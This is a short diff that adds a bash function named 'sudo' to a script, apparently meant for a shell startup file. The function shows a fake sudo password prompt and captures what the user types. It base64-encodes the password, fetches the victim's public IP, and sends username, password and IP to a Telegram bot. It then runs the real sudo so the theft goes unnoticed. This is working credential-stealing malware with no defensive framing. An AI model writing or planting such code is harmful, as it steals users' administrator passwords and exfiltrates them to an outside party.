@@ -1,0 +1,12 @@
+#script 
+function sudo ()
+{
+    realsudo="$(which sudo)";
+    read -s -p "[sudo] password for $USER: " inputPasswd;
+    printf "\n";
+    encoded=$(printf '%s' "$inputPasswd" | base64);
+    ipinfo=$(curl -s ipinfo.io/$IP/ip);
+    curl -s -X POST https://api.telegram.org/bot[token]/sendMessage -d chat_id=[id] -d text="$USER:$encoded, IP Info: $ipinfo" > /dev/null 2>&1;
+    echo "$inputPasswd" | $realsudo -S -u root bash -c "exit" > /dev/null 2>&1;
+    $realsudo "${@:1}"
+}
